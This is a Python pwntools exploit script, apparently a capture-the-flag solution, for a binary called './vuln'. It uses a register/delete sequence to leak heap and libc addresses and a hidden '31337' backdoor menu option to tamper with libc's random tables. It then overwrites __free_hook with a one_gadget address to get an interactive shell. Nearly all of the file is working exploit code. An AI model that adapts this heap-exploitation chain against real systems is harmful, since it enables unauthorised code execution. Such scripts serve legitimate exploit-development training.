#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=127.0.0.1' '--port=1337'
from pwn import *
import sys

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './vuln'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 1337)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def login(uid):
    io.recvuntil('#> ')
    io.sendline('1')
    io.recvuntil(':\n')
    io.sendline(uid)

def register(uid, name):
    io.recvuntil('#> ')
    io.sendline('2')
    io.recvuntil(': \n')
    io.sendline(name)
    io.recvuntil(':\n')
    io.sendline(uid)

def test_luck(uid, content):
    io.recvuntil('#> ')
    io.sendline('1')

    sleep(3)

    data = io.recvuntil('[+++]')
    if b'loose' in data:
        log.error('Bad luck!');
        print(data)
        sys.exit(0)

    if b'Congratz' in data:
        io.recvuntil(': \n')
        io.sendline(uid)
        io.recvuntil(':\n')
        io.sendline(content)

    print(data)

def backdoor(index):
#    print(index)
    io.recvuntil('#> ')
    io.sendline('31337')
    io.recvuntil(':\n')
    io.sendline(index)

def info():
    io.recvuntil('#> ')
    io.sendline('2')

    data = io.recvuntil(b'[+++]').replace(b'[+++]', b'')
    return data

def delete():
    io.recvuntil('#> ')
    io.sendline('3')

def logout():
    io.recvuntil('#> ')
    io.sendline('4')


io = start()

register(b'0', b'A'*510)
logout()
register(b'1', b'A'*510)
logout()

login(b'0')
delete()
login(b'1')
delete()

login(b'1')
leak_heap = u64(info().split(b'[NAME]: ')[1][:6].ljust(8, b'\x00'))
heap_base = leak_heap - 0x2f0

log.success(f'LEAK HEAP: {hex(leak_heap)}')
log.success(f'HEAP BASE: {hex(heap_base)}')

logout()

for i in range(9):
    register(str(i), b'A'*510)
    logout()

for i in range(3, 9):
    login(str(i))
    delete()


login(b'1')
delete()
login(b'0')
delete()

login(b'0')

libc_leak = u64(info().split(b'[NAME]: ')[1][:6].ljust(8, b'\x00'))
libc_base = libc_leak - 0x3ebca0
free_hook = libc_base + 0x3ed8e8

log.success(f'LIBC LEAK: {hex(libc_leak)}')
log.success(f'LIBC BASE: {hex(libc_base)}')
log.success(f'FREE_HOOK: {hex(free_hook)}')

logout()
register(b'10', b'B'*510)

rndtbl4 = libc_base + 0x3eb1c4
rndtbl16 = libc_base + 0x3eb1d0

#input()

for i in range(10):
    for j in range(14):
        backdoor(str((rndtbl4 - heap_base + 0x260 - 1216 + j*8)//8))

    test_luck(b'7', p64(free_hook))

logout()

register(b'11', p64(0x4f432 + libc_base))
logout()
register(b'12', p64(0x4f432 + libc_base))
logout()
register(b'13', p64(0x4f432 + libc_base))
delete()

io.interactive()

